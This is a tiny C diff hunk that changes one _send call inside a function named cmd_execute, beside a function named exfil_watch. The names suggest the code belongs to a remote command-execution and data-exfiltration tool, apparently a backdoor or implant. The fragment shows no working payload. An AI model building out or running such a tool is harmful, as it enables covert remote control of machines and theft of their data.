@@ -180,7 +180,7 @@ void cmd_execute(char *command, uint32 ip) {
 
 	tot_len = strlen(resp) + 1;
 
-	_send(ip, resp);
+	_send(ip, resp, CMD_TYP);
 }
 
 void *exfil_watch(void *arg) {
